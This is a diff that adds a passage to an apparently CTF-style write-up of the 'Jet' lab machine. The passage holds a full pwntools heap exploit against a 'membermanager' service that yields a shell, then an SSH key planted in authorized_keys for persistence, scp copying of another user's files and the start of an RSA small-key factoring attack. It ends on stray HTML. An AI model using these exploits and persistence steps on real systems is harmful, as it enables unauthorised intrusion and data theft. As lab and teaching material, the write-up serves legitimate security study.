@@ -1062,6 +1062,231 @@ java -cp ".:/usr/share/elasticsearch/lib/*" Program | jq
 ## Member Manager
 
 We had the password from zip decrypting the message xor, so we simply unzipped it, doing so leaves us with 2 ejecutables Linux files
+```console
+unzip exploitme.zip
+Archive:  exploitme.zip
+[exploitme.zip] membermanager password: securewebincrocks  
+  inflating: membermanager           
+  inflating: memo
+
+❯ ls
+ membermanager   memo
+```
+One of them is membermanager the one that when running it locally shows us the same thing as when connecting to the machine through the port 5555, so we know that it is running it.
+
+```console
+./membermanager  
+enter your name:
+test
+Member manager!
+1. add
+2. edit
+3. ban
+4. change name
+5. get gift
+6. exit
+```
+```console
+netcat 10.13.37.10 5555  
+enter your name:
+test
+Member manager!
+1. add
+2. edit
+3. ban
+4. change name
+5. get gift
+6. exit
+```
+Actually this is a challenge from heap del 0x00ctf 2017, there are many explanations on the internet, because it is somewhat long I will leave a reference and we will move on to the script
+```console
+#!/usr/bin/python3
+from pwn import remote, p64, p16
+
+shell = remote("10.13.37.10", 5555)
+
+def add(size, data):
+    shell.sendlineafter(b"6. exit", b"1")
+    shell.sendlineafter(b"size:", str(size).encode())
+    shell.sendlineafter(b"username:", data)
+
+def edit(idx, mode, data):
+    shell.sendline(b"2")
+    shell.sendlineafter(b"2. insecure edit", str(mode).encode())  
+    shell.sendlineafter(b"index:", str(idx).encode())
+    shell.sendlineafter(b"username:", data)
+    shell.recvuntil(b"6. exit")
+
+def ban(idx):
+    shell.sendline(b"3")
+    shell.sendlineafter(b"index:", str(idx).encode())
+    shell.recvuntil(b"6. exit")
+
+def change(data):
+    shell.sendline(b"4")
+    shell.sendlineafter(b"name:", data)
+    shell.recvuntil(b"6. exit")
+
+shell.sendlineafter(b"name:", b"A" * 8)
+
+add(0x88, b"A" * 0x88)
+add(0x100, b"A" * 8)
+
+payload  = b"A" * 0x160
+payload += p64(0)
+payload += p64(0x21)
+
+add(0x500, payload)
+add(0x88, b"A" * 8)
+
+shell.recv()
+ban(2)
+
+payload  = b""
+payload += b"A" * 0x88
+payload += p16(0x281)
+
+edit(0, 2, payload)
+
+shell.recv()
+shell.sendline(b"5")
+shell.recvline()
+
+leak_read = int(shell.recvline()[:-1], 10)
+libc_base = leak_read - 0xf7250
+
+payload  = b""
+payload += p64(0) * 3
+payload += p64(libc_base + 0x45390)
+
+change(payload)
+
+payload  = b""
+payload += b"A" * 256
+payload += b"/bin/sh\x00"
+payload += p64(0x61)
+payload += p64(0)
+payload += p64(libc_base + 0x3c5520 - 0x10)
+payload += p64(2)
+payload += p64(3)
+payload += p64(0) * 21
+payload += p64(0x6020a0)
+
+edit(1, 1, payload)
+
+shell.sendline(b"1")
+shell.sendlineafter(b"size:", str(0x80).encode())
+shell.recvuntil(b"[vsyscall]")
+shell.recvline()
+shell.interactive()
+```
+When running the script we get one shell as the user membermanager
+
+```console
+python3 exploit.py
+[+] Opening connection to 10.13.37.10 on port 5555: Done
+[*] Switching to interactive mode
+$ id
+uid=1006(membermanager) gid=1006(membermanager) groups=1006(membermanager)
+$ hostname -I
+10.13.37.10
+$
+```
+By going to your home directory we can see the flag, so we simply read it
+
+```console
+$ cd /home/membermanager
+$ ls
+flag.txt
+membermanager
+$ cat flag.txt
+JET{h******************z}
+```
+Again we are going to write our key publica as a key autorizada on the victim machine so that we can later connect without a password by ssh
+
+```console
+$ mkdir .ssh
+$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE7DwLVBJlEPeKvWMKsQTsU7m4ULfVSJRx1hVaZAo0Rv kali@kali" > .ssh/authorized_keys  
+$
+```
+```console
+ssh membermanager@10.13.37.10
+membermanager@jet:~$ id
+uid=1006(membermanager) gid=1006(membermanager) groups=1006(membermanager)  
+membermanager@jet:~$ hostname -I
+10.13.37.10
+membermanager@jet:~$ head -n1 flag.txt 
+JET{h*********************z}
+membermanager@jet:~$
+```
+## More Secrets
+
+In the home user directory tony we can find 2 files with extension .encand a public key which has the name public.crt
+
+```console
+membermanager@jet:/home/tony$ ls -l *
+-rw-r--r-- 1 root root  129 Dec 28  2017 key.bin.enc  
+-rw-r--r-- 1 root root 4768 Dec 28  2017 secret.enc
+
+keys:
+-rw-r--r-- 1 root root 451 Dec 28  2017 public.crt
+membermanager@jet:/home/tony$
+```
+To work locally we can download the files recursivausing scp the connection ssh we have
+
+```console
+$ scp -r membermanager@10.13.37.10:"/home/tony/*" .
+key.bin.enc                                  100%  129     0.7KB/s   00:00
+public.crt                                   100%  451     2.3KB/s   00:00
+secret.enc                                   100% 4768    24.5KB/s   00:00  
+
+$ tree 
+.
+├── key.bin.enc
+├── keys
+│   └── public.crt
+└── secret.enc
+
+2 directories, 3 files
+```
+In the directory we have a really small keys keypublica
+
+```console
+$ cat public.crt
+
+
+-----BEGIN PUBLIC KEY-----
+MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQGN24SSfsyl/rFafZuCr54a
+BqEpk9fJDFa78Qnk177LTPwWgJPdgY6ZZC9w7LWuy9+fSFfDnF4PI3DRPDpvvqmB
+jQh7jykg7N4FUC5dkqx4gBw+dfDfytHR1LeesYfJI6KF7s0FQhYOioCVyYGmNQop
+lt34bxbXgVvJZUMfBFC6LQKBgQCkzWwClLUdx08Ezef0+356nNLVml7eZvTJkKjl
+2M6sE8sHiedfyQ4Hvro2yfkrMObcEZHPnIba0wZ/8+cgzNxpNmtkG/CvNrZY81iw
+2lpm81KVmMIG0oEHy9V8RviVOGRWi2CItuiV3AUIjKXT/TjdqXcW/n4fJ+8YuAML  
+UCV4ew==
+-----END PUBLIC KEY-----
+```
+Let’s start by getting its values, using the library Crypto we can open our key and with a simple script get only 2 of its values ​​which are e and n
+```console
+#!/usr/bin/python3
+from Crypto.PublicKey import RSA
+
+file = open("public.crt", "r")
+key = RSA.importKey(file.read())  
+
+e = key.e
+n = key.n
+
+print(f"e: {e}")
+print(f"n: {n}")
+```
+```console
+python3 exploit.py
+e: 115728201506489397643589591830500007746878464402967704982363700915688393155096410811047118175765086121588434953079310523301854568599734584654768149408899986656923460781694820228958486051062289463159083249451765181542090541790670495984616833698973258382485825161532243684668955906382399758900023843171772758139  
+n: 279385031788393610858518717453056412444145495766410875686980235557742299199283546857513839333930590575663488845198789276666170586375899922998595095471683002939080133549133889553219070283957020528434872654142950289279547457733798902426768025806617712953244255251183937835355856887579737717734226688732856105517
+```
+In this case the key is quite pequeña, we must take into account that the value of nis the result of the multiplication of 2 prime numbers, if we use factordb.com we can factorize n, the 2 numbers that it returns are defined as p and q
+
+
 
 <html lang="en">
 <head>
